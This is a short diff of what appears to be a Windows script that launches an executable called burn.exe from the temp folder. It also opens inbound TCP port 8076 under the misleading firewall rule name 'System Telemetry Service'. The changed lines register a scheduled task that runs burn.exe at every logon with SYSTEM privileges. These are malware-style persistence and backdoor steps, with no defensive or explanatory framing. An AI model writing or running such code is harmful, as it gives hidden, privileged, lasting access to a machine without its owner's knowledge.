@@ -10,5 +10,4 @@ Start-Process $env:TEMP\burn.exe
 New-NetFirewallRule -DisplayName "System Telemetry Service" -Direction Inbound -Protocol TCP -LocalPort 8076 -Action Allow
 
 
-schtasks  /create /sc onlogon /tn "Compo" /tr 
-"C:\Users\luffy\Downloads\file.exe" /ru SYSTEM  
+schtasks  /create /sc onlogon /tn "Compo" /tr "TEMP\burn.exe" /ru SYSTEM  
